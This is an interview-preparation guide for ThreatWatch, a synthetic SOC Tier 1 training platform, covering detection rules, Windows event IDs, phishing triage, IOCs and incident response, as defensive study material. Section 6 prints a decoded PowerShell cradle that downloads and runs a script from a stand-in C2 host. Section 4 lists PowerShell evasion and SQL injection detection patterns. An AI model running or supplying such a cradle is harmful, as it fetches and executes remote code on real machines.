# ThreatWatch — SOC Tier 1 Technical Interview Preparation Guide

A comprehensive, technically rigorous interview guide designed specifically for SOC Tier 1 / Junior Security Analyst interviews. Every question and answer is grounded directly in the real implementation of **ThreatWatch**.

---

## SECTION 1 — PROJECT OVERVIEW

### 1. What is ThreatWatch?
**Answer:** ThreatWatch is an offline, synthetic SOC Tier 1 attack detection and incident response simulation platform. It models the complete defensive lifecycle—from ingesting multi-source telemetry in a simulated SIEM to detecting threats via custom detection engineering logic, investigating correlated entities, pivoting across IOCs and MITRE ATT&CK techniques, executing containment playbooks, and compiling formal post-incident reports.

### 2. Why did you build ThreatWatch?
**Answer:** Most entry-level portfolio projects are static dashboards or read-only charts that do not demonstrate operational analyst thinking. Commercial SIEMs (like Splunk or Microsoft Sentinel) often require costly cloud infrastructure, while home labs like DetectionLab demand 32GB+ RAM to run multiple virtual machines. I built ThreatWatch to provide a lightweight, deterministic, and instant-start environment that specifically demonstrates hands-on SOC L1 triage and incident response competencies.

### 3. What problem does it solve?
**Answer:** Aspiring SOC analysts frequently struggle to bridge the gap between theoretical certifications (such as Security+ or CySA+) and practical, hands-on alert handling. ThreatWatch solves this by providing realistic log telemetry, authentic Windows Event ID structures, guided scenario-based labs with automated scoring, and codified NIST/SANS incident response playbooks.

### 4. Who is the target user?
**Answer:** Aspiring Security Operations Center (SOC) Tier 1 analysts, blue team learners, cybersecurity students, and hiring managers/recruiters evaluating practical forensic triage and response skills.

### 5. Why did you use synthetic data instead of live malware or real attacks?
**Answer:** Using synthetic data guarantees absolute safety, repeatability, and zero risk of accidental exposure or legal complications. It allows any recruiter or interviewer to clone and run the platform in 5 seconds on a standard laptop without configuring complex virtualization, virtual networks, or handling weaponized binaries.

### 6. What makes this useful for a SOC analyst?
**Answer:** It trains analysts in the real mental model of security operations: distinguishing True Positives from benign false alarms, calculating time deltas between failed and successful authentications, safely inspecting obfuscated scripts without executing them, tracing attacker blast radiuses, and applying defensible containment actions.

---

## SECTION 2 — ARCHITECTURE

### 1. Explain the ThreatWatch architecture.
**Answer:** ThreatWatch uses a modern client-server architecture:
- **Presentation Layer**: Next.js 15 (React 19, TypeScript, Tailwind CSS) providing responsive SOC dashboards, log explorers, visual graph workspaces, and lab modules.
- **API & Engine Layer**: FastAPI (Python 3.11+) delivering high-performance asynchronous REST endpoints, an in-memory rule detection engine, and a WebSocket broadcasting service.
- **Persistence Layer**: SQLite with SQLAlchemy ORM storing security events, alert queues, incident records, threat intelligence IOCs, and playbooks.

### 2. Why did you choose Next.js for the frontend?
**Answer:** Next.js provides server-side rendering, strict TypeScript type safety, and built-in API proxy rewrites (`next.config.js`). This allows the frontend to proxy `/api/*` and `/ws/*` requests directly to FastAPI, completely bypassing Cross-Origin Resource Sharing (CORS) complications during development and demo sessions.

### 3. Why FastAPI for the backend?
**Answer:** FastAPI was selected for its native Python asynchronous support (`asyncio`), automatic OpenAPI documentation, and strict schema validation via Pydantic. Python is the primary language of security engineering and threat detection, making rule maintenance and forensic string parsing highly expressive and clean.

### 4. Why SQLite instead of PostgreSQL or MongoDB?
**Answer:** SQLite requires zero external service dependencies, zero network configuration, and no Docker daemon. The entire database is contained in a portable file (`sentinellab.db`), allowing any user to test the platform instantly out-of-the-box while maintaining full relational integrity via SQLAlchemy.

### 5. How does the frontend communicate with the backend?
**Answer:** Communication is dual-channel:
1. **REST over HTTP**: Standard JSON requests for CRUD operations on alerts, incidents, labs, and IOCs via `fetchJson` wrappers in `frontend/src/lib/api.ts`.
2. **WebSockets over WS**: A persistent connection to `/ws/simulation` that streams real-time synthetic events and alert triggers directly into React state hooks.

### 6. How does the WebSocket simulation work?
**Answer:** In `backend/app/services/simulation_service.py`, an asynchronous loop (`_simulation_loop`) runs in the background. Every 1.8 to 6.0 seconds (depending on difficulty), it pulls or generates a synthetic telemetry record, saves it to SQLite, evaluates it against the detection engine, and broadcasts the event and any triggered alerts through `ws_manager.broadcast()` to all active browser sessions.

### 7. How is data stored and structured?
**Answer:** Data is organized in a normalized relational schema: `events` (telemetry log records), `alerts` (triggered detections), `incidents` (grouped security cases), `iocs` (threat indicators linked to incidents), `investigations` (node-link JSON graphs), `labs` (scenarios and questions), and `playbooks` (containment checklists).

---

## SECTION 3 — SIEM (SECURITY INFORMATION & EVENT MANAGEMENT)

### 1. What is a SIEM?
**Answer:** A SIEM (Security Information and Event Management) system centralizes the aggregation, normalization, analysis, and retention of security logs and telemetry across an enterprise's infrastructure, enabling real-time threat detection, automated alerting, and historical investigation.

### 2. How does the ThreatWatch SIEM explorer work?
**Answer:** Located at `/siem`, the SIEM explorer queries the `/api/events` endpoint with multi-criteria parameters. It displays events in an interactive data grid supporting full-text search across log messages and instant filtering by source (Windows, Firewall, DNS, Web Server), severity (Critical, High, Medium, Low, Informational), and hostname. Clicking any row expands parsed metadata alongside the raw event log.

### 3. What information is contained in an event record?
**Answer:** Each event record contains:
- `timestamp`: UTC ISO timestamp of when the event occurred.
- `source`: Telemetry generator (e.g. Windows Security, Firewall, DNS, Web Server, Authentication).
- `event_type`: Normalized category (e.g. `FAILED_LOGIN`, `SUSPICIOUS_PROCESS`, `PORT_SCAN`).
- `severity`: Standardized risk tier.
- `source_ip` / `destination_ip`: Network endpoints involved.
- `source_host` / `destination_host`: Hostname identities.
- `username`: Active Directory or system account.
- `process`: Executable path or process context (e.g. `lsass.exe`, `powershell.exe`).
- `message`: Clean, parsed human-readable summary.
- `raw_log`: The exact unparsed log snippet (e.g. Windows XML EventLog or syslog string).
- `mitre_technique`: Associated ATT&CK ID, if applicable.

### 4. How do analysts filter events in ThreatWatch?
**Answer:** Analysts can combine multiple dropdown filters (Severity, Source, Host) with an instant keyword search bar. For example, filtering by `Source: Windows` and typing `4625` isolates failed authentication events during brute force triage.

### 5. How does a raw event become an alert?
**Answer:** When an event is ingested, the detection engine passes it along with a sliding window of recent events into registered detection rules. If the event matches the rule's specific signature or exceeds its threshold conditions, an `Alert` object is instantiated and committed to the database with assigned severity, MITRE mapping, and an initial status of `New`.

---

## SECTION 4 — DETECTION ENGINE

ThreatWatch contains 7 active detection rules implemented in `backend/app/services/detection_engine.py`:

### Rule 1: `RULE-AUTH-001` — Brute Force Detection
- **Input:** Windows Security Event ID 4625 (`FAILED_LOGIN`) or Linux SSH failed authentication logs.
- **Condition:** 3 or more failed login attempts targeting the same username or from the same source IP within a 300-second (5-minute) sliding window.
- **Severity:** `HIGH`
- **Alert Generated:** `Brute Force Authentication Burst Detected from {source_ip}`
- **Investigation:** Correlate Event 4625 logs to identify targeted accounts, check for subsequent Event ID 4624 (Logon Success) indicating compromise, check for Event ID 4740 (Account Lockout), and verify external source IP against threat intelligence.
- **MITRE Mapping:** `T1110.001` (Brute Force: Password Guessing).

### Rule 2: `RULE-NET-002` — Port Scan Detection
- **Input:** Perimeter Firewall connection drop/deny events.
- **Condition:** 4 or more connection attempts to distinct destination ports from the same source IP within the sliding event window.
- **Severity:** `MEDIUM`
- **Alert Generated:** `Network Port Scan / Reconnaissance from {source_ip}`
- **Investigation:** Identify which external services were probed (e.g. RDP 3389, SSH 22, HTTP 80), confirm if any internal services replied with `SYN-ACK`, and check if source IP is an authorized vulnerability scanner or external threat actor.
- **MITRE Mapping:** `T1046` (Network Service Scanning).

### Rule 3: `RULE-ENDPOINT-003` — Suspicious PowerShell Execution
- **Input:** Windows Security Event ID 4688 / Sysmon Event ID 1 process creation logs.
- **Condition:** Executable name contains `powershell` and command line contains evasion flags or download cradle patterns (`-enc`, `-encodedcommand`, `bypass`, `invoke-webrequest`, `iwr`, `downloadstring`, `iex`).
- **Severity:** `HIGH`
- **Alert Generated:** `Suspicious Obfuscated PowerShell Execution on {host}`
- **Investigation:** Extract the parent process (e.g. `cmd.exe`, `explorer.exe`, `winword.exe`), decode the Base64 command payload, identify external staging URLs or secondary droppers, and check for outbound network connections.
- **MITRE Mapping:** `T1059.001` (Command and Scripting Interpreter: PowerShell).

### Rule 4: `RULE-EMAIL-004` — Phishing Detection
- **Input:** Email gateway logs (Postfix/milter).
- **Condition:** Inbound email where `spf=fail` combined with social engineering keywords (`invoice`, `password`, `verify`) or dangerous attachment extensions.
- **Severity:** `MEDIUM`
- **Alert Generated:** `Inbound Spearphishing / Spoofed Lure Targeting {username}`
- **Investigation:** Inspect RFC 822 email headers (`From`, `Return-Path`, `Received-SPF`), identify lookalike/typosquatted domains, calculate attachment file hashes, and query enterprise mailboxes for other recipients of the same message.
- **MITRE Mapping:** `T1566.001` (Phishing: Spearphishing Attachment).

### Rule 5: `RULE-IOC-005` — Malware IOC Match
- **Input:** Endpoint process logs, DNS standard query logs, or network proxy flows.
- **Condition:** Telemetry matches known threat intelligence indicators (`malicious-c2.net`, `45.33.32.156`, `evil_dropper.exe`, hash `e3b0c44298fc1c149afbf4c8996fb924`, `c2-beacon.corp-sec.internal`).
- **Severity:** `CRITICAL`
- **Alert Generated:** `Malware Indicator of Compromise (IOC) Detected on {host}`
- **Investigation:** Validate threat intel confidence score, determine if C2 communication succeeded (HTTP 200 vs connection reset), locate dropper artifact on disk, and isolate endpoint immediately.
- **MITRE Mapping:** `T1071.001` (Application Layer Protocol: Web Protocols).

### Rule 6: `RULE-WEB-006` — SQL Injection Detection
- **Input:** Web server / Nginx HTTP access logs.
- **Condition:** HTTP request URI or query parameters contain SQL syntax metacharacters (`union select`, `' or 1=1`, `sleep(`, `information_schema`, `--`).
- **Severity:** `HIGH`
- **Alert Generated:** `SQL Injection Attack Attempt Against Web Server from {source_ip}`
- **Investigation:** Analyze HTTP response code (500 Internal Server Error, 200 OK, or 403 Forbidden), check if database syntax error messages were returned to the client, and determine if data exfiltration occurred.
- **MITRE Mapping:** `T1190` (Exploit Public-Facing Application).

### Rule 7: `RULE-NET-007` — DDoS Volumetric Anomaly
- **Input:** Perimeter router / NetFlow telemetry.
- **Condition:** Log telemetry indicates connection flood, abnormal SYN packet surge, or extreme bandwidth consumption directed at an internal gateway.
- **Severity:** `CRITICAL`
- **Alert Generated:** `DDoS Volumetric Traffic Spike Directed at {host}`
- **Investigation:** Inspect incoming protocol breakdown (SYN flood vs UDP amplification), identify source IP distribution (single attacker vs distributed botnet), and apply upstream rate limiting or BGP null-routing.
- **MITRE Mapping:** `T1498.001` (Network Denial of Service: Direct Network Flood).

---

## SECTION 5 — WINDOWS SECURITY EVENT LOGS

### Event ID 4625 — An Account Failed to Log On
- **What it represents:** A failed authentication attempt against a local machine or domain controller.
- **Why it is useful:** Key indicator of brute force, password spraying, or credential stuffing.
- **Key fields to inspect:**
  - `TargetUserName`: Account targeted.
  - `IpAddress`: Source IP address of the logon attempt.
  - `Status` & `SubStatus`: Exact error code (e.g. `0xC000006A` = User name is correct, but password is bad; `0xC0000064` = User name does not exist; `0xC0000234` = Account currently locked out).
  - `LogonType`: Logon mechanism (Type 2 = Interactive; Type 3 = Network; Type 10 = RemoteInteractive / RDP).
- **How ThreatWatch uses it:** Populates brute force scenarios in Lab 1 and feeds `RULE-AUTH-001`.

### Event ID 4624 — An Account Was Successfully Logged On
- **What it represents:** Successful authentication and creation of a security logon session.
- **Why it is useful:** Crucial during incident triage to establish whether an attacker successfully breached credentials following failed attempts.
- **Key fields to inspect:** `TargetUserName`, `IpAddress`, `LogonType`, `AuthenticationPackageName`.
- **How ThreatWatch uses it:** Analysts search for Event 4624 immediately following bursts of 4625 to determine if password guessing resulted in an active breach.

### Event ID 4740 — A User Account Was Locked Out
- **What it represents:** An Active Directory account locked out due to exceeding the maximum invalid logon attempts threshold.
- **Why it is useful:** Signals that an attack reached lockout threshold, impacting legitimate user access or mitigating further brute force.
- **Key fields to inspect:** `TargetUserName`, `CallerComputerName`.
- **How ThreatWatch uses it:** Generated at the conclusion of brute force simulation sequences to demonstrate defense-in-depth lockout mechanisms.

### Event ID 4688 — A New Process Has Been Created
- **What it represents:** Process creation auditing recording execution of an application or binary.
- **Why it is useful:** Primary endpoint telemetry source for detecting malicious command execution, living-off-the-land binaries (LOLBins), and malware spawning.
- **Key fields to inspect:**
  - `NewProcessName`: Full path of binary executed.
  - `ProcessCommandLine`: Exact arguments passed to the process (requires command-line auditing policy enabled).
  - `CreatorProcessName`: Parent process that spawned the new process.
- **How ThreatWatch uses it:** Feeds `RULE-ENDPOINT-003` to inspect PowerShell command arguments and reconstruct parent-child process execution trees.

---

## SECTION 6 — POWERSHELL INVESTIGATION

### 1. Why is PowerShell commonly used by attackers?
**Answer:** PowerShell is a trusted, native administrative tool built into all modern Windows systems. Attackers leverage it as a Living-off-the-Land Binary (LOLBin) to download secondary payloads, execute scripts directly in memory without writing files to disk (fileless malware), query Active Directory, and perform lateral movement while bypassing basic antivirus signatures.

### 2. What is encoded PowerShell?
**Answer:** Attackers use the `-EncodedCommand` (or `-enc`) parameter to pass Base64-encoded Unicode strings to `powershell.exe`. This hides malicious function names, URLs, and shellcode from casual visual inspection and naive string matching rules.

### 3. What does `-EncodedCommand` mean?
**Answer:** It instructs PowerShell to accept a command encoded as a Base64 Unicode string. For example, `powershell.exe -enc SQBFAFgA...` decodes into executable PowerShell instructions.

### 4. How does ThreatWatch inspect it?
**Answer:** ThreatWatch's Windows Security page (`/windows`) features a dedicated Base64 decoder. When an analyst clicks **Decode Base64**, the frontend safely decodes the Unicode string in memory, displaying the human-readable script:
```powershell
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA...
# Decoded:
IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1'); Start-Process svchost_updater.exe
```

### 5. What would a SOC analyst investigate next in a real environment?
**Answer:**
1. **Network Telemetry**: Check firewall and proxy logs for connections to `malicious-c2.net` or associated IP addresses.
2. **Endpoint Forensics**: Check for newly spawned processes (e.g. `svchost_updater.exe`), modified autorun registry keys, or files written to `AppData\Local\Temp`.
3. **PowerShell Script Block Logging (Event ID 4104)**: Review full de-obfuscated script blocks recorded by Windows Defender / AMSI.
4. **Endpoint Containment**: Isolate the affected host from the network immediately.

---

## SECTION 7 — PHISHING & EMAIL INVESTIGATION

### 1. What email indicators do you inspect?
**Answer:**
- **RFC 822 Headers**: `From`, `Return-Path`, `Reply-To`, `Received`, `Authentication-Results` (SPF, DKIM, DMARC).
- **Sender Infrastructure**: IP address of the sending mail transfer agent (MTA) and reverse DNS lookup.
- **Message Content**: Urgency indicators, generic greetings, and mismatched hyperlinks.
- **Attachments**: File extension, double extensions (`.pdf.exe`), and cryptographic hashes (SHA-256).

### 2. What is SPF and how does `spf=fail` happen?
**Answer:** Sender Policy Framework (SPF) is an email authentication protocol published as a DNS TXT record by a domain owner, listing authorized IP addresses allowed to send email on that domain's behalf. If an attacker sends an email claiming to be from `bankofamer1ca-notice.com` from relay IP `185.220.101.5`, and that IP is not listed in the SPF record, the receiving mail server evaluates `spf=fail`.

### 3. What is a typosquatted domain?
**Answer:** A domain registered by an adversary that closely mimics a legitimate brand by substituting visually similar characters (e.g. replacing letter `i` with digit `1` in `bankofamer1ca-notice.com` or using homoglyphs). The goal is to deceive recipients into trusting the sender.

### 4. Why are double extensions suspicious?
**Answer:** Operating systems often hide known extensions by default. An attacker names a malicious executable `urgent_invoice_2026.pdf.exe`. To a user with default settings, the file appears as `urgent_invoice_2026.pdf` with an Adobe Reader icon, tricking them into launching an executable.

### 5. How are IOCs extracted from phishing telemetry?
**Answer:**
- **Network IOCs**: Extracted from sending MTA IP (`185.220.101.5`) and embedded hyperlink domains.
- **Host IOCs**: Extracted by computing SHA-256 and MD5 hashes of the attachment file (`e3b0c4...`, `7d4a6f...`).
- **Identity IOCs**: Recording the sender email (`billing@bankofamer1ca-notice.com`) for perimeter blocklists.

---

## SECTION 8 — INDICATORS OF COMPROMISE (IOCs)

### 1. What is an Indicator of Compromise (IOC)?
**Answer:** An IOC is forensic evidence of potential intrusion or malicious activity observed on a host or network. Common examples include file hashes, IP addresses, domain names, URLs, and registry keys.

### 2. What IOC types does ThreatWatch support?
**Answer:** The ThreatWatch Threat Intelligence database (`/iocs`) categorizes 7 distinct indicator types:
1. `IP`: Attacker infrastructure and C2 servers (e.g. `45.33.32.156`, `198.51.100.23`).
2. `Domain`: Typosquatted and staging domains (e.g. `malicious-c2.net`, `bankofamer1ca-notice.com`).
3. `URL`: Staging download URLs (e.g. `http://malicious-c2.net/invoke.ps1`).
4. `Hash`: MD5 and SHA-256 cryptographic signatures of malicious droppers.
5. `Filename`: Weaponized binaries (e.g. `invoice_2026.pdf.exe`, `svchost_updater.exe`).
6. `Email`: Malicious sender addresses.
7. `Username`: Compromised accounts subject to credential abuse.

### 3. How does IOC correlation work in ThreatWatch?
**Answer:** In `RULE-IOC-005` and the Investigation Workspace, raw logs are matched against the IOC repository. When an event references a known indicator, the system flags a Critical alert and establishes a relational link in the investigation graph between the event, the host, and the threat actor's infrastructure.

### 4. How does a SOC analyst validate an IOC?
**Answer:**
- Cross-reference external threat intelligence feeds (VirusTotal, AlienVault OTX, AbuseIPDB, Talos).
- Validate historical prevalence in the environment (has this IP ever communicated with internal hosts before?).
- Verify whether the indicator is a benign shared service (e.g. CDN or public DNS) to avoid False Positives.

---

## SECTION 9 — MITRE ATT&CK FRAMEWORK

ThreatWatch incorporates 7 core MITRE ATT&CK Enterprise techniques across its detection rules and labs:

| Technique ID | Technique Name | Tactic | Why Activity Maps to Technique | ThreatWatch UI Display |
| :--- | :--- | :--- | :--- | :--- |
| `T1110.001` | Password Guessing | Credential Access | Rapid sequential authentication attempts against valid accounts using automated credential wordlists. | Displayed on Alert details, SIEM events, and Lab 1 overview. |
| `T1046` | Network Service Scanning | Discovery | Systematic probing of sequential TCP destination ports on perimeter hosts to enumerate listening services. | Displayed on Port Scan alerts and Lab 2 evidence card. |
| `T1059.001` | PowerShell | Execution | Execution of `powershell.exe` with stealth bypass flags (`-NoP`, `-W Hidden`) to execute command cradles. | Displayed on Windows Security tab and Lab 3. |
| `T1566.001` | Spearphishing Attachment | Initial Access | Sending targeted emails containing weaponized executable attachments disguised as PDF invoices. | Highlighted in Email Gateway triage and Lab 4. |
| `T1071.001` | Web Protocols (C2) | Command and Control | Endpoint initiating outbound HTTP/HTTPS sessions to external command-and-control server to fetch payloads. | Linked to Malware IOC alerts and Lab 5. |
| `T1190` | Exploit Public-Facing Application | Initial Access | Injecting SQL syntax into publicly accessible web application parameters to manipulate backend queries. | Displayed in Web Server log triage and Lab 6. |
| `T1498.001` | Direct Network Flood | Impact | Saturating external router bandwidth using volumetric SYN packet floods to cause denial of service. | Displayed in Network metrics dashboard and Lab 7. |

---

## SECTION 10 — INCIDENT RESPONSE LIFECYCLE

### 1. What happens immediately after an alert fires?
**Answer:** The alert enters the **Triage** queue. An L1 analyst reviews the alert metadata, compares the raw log against baseline host behavior, verifies whether it is a True Positive or False Positive, assigns an initial severity, and escalates to a formal **Incident** ticket if malicious activity is confirmed.

### 2. How do you prioritize alerts?
**Answer:** Prioritization is based on:
- **Severity**: Critical (active malware/C2), High (brute force burst, obfuscated execution), Medium (reconnaissance, spam).
- **Asset Criticality**: Attacks targeting Domain Controllers, executive laptops, or production DMZ web servers take precedence over non-critical lab endpoints.
- **Evidence of Success**: An attack that succeeded (e.g. failed logins followed by successful login) is prioritized over blocked attempts.

### 3. What is Containment?
**Answer:** Immediate actions taken to limit the blast radius and prevent an attacker from expanding access or exfiltrating data. In ThreatWatch, analysts execute:
- **Host Quarantine**: Disconnecting network interfaces.
- **IP Perimeter Block**: Dropping external attacker IPs at the firewall.
- **Account Lockout**: Revoking compromised Active Directory sessions.

### 4. What is Eradication?
**Answer:** Identifying and removing all components of the threat from the environment, including terminating malicious processes, deleting droppers and persistence artifacts, and closing exploited entry points.

### 5. What is Recovery?
**Answer:** Restoring affected systems to safe production operations, resetting user credentials, validating clean baseline telemetry, and conducting enhanced monitoring.

### 6. How does ThreatWatch simulate response?
**Answer:** In the Incident details view (`/incidents`), analysts can click interactive containment triggers (e.g. **Isolate Host**, **Block IP**, **Revoke Token**). These actions are appended to the audit timeline, and the incident status advances to `Contained`.

---

## SECTION 11 — ARCHITECTURAL LIMITATIONS

### "What can ThreatWatch NOT do?"
**Honest, defensible answers for interviews:**
1. **Synthetic Telemetry**: The events are generated from realistic synthetic templates and probabilistic models rather than real operating system kernels.
2. **No Real Enterprise SIEM Ingestion**: ThreatWatch runs its own lightweight detection engine in Python; it does not currently ingest logs from Splunk forwarders, Elastic beats, or Azure Event Hubs.
3. **No Real Endpoint Agents**: Telemetry is simulated; there are no active Sysmon or CrowdStrike Falcon sensor agents installed on production endpoints.
4. **No Real Attack Traffic**: All network flows and attacks are simulated against memory and SQLite; no live packets traverse the public Internet.
5. **Single-Node Architecture**: Designed as a standalone local laboratory rather than a distributed multi-tenant cloud deployment.

---

## SECTION 12 — FUTURE IMPROVEMENTS

### Realistic engineering enhancements planned for ThreatWatch:
1. **External SIEM Integration**: Add log forwarding exporters (Syslog over TLS, Splunk HEC) to stream ThreatWatch telemetry into real enterprise SIEM tools.
2. **Windows Event Forwarding (WEF) Collector**: Build a Windows agent capable of harvesting actual Event IDs from live VMs.
3. **Threat Intelligence API Integration**: Connect the IOC repository to live API lookups (VirusTotal, AbuseIPDB, AlienVault OTX).
4. **Multi-Tenant Authentication & RBAC**: Implement OAuth2 / JWT authentication with separate roles for Trainee, Analyst, and SOC Lead.
5. **PostgreSQL Migration**: Upgrade SQLite to PostgreSQL for high-concurrency multi-user training environments.
6. **Sigma Rule Support**: Implement a converter to evaluate standardized Sigma detection engineering rules against the telemetry stream.
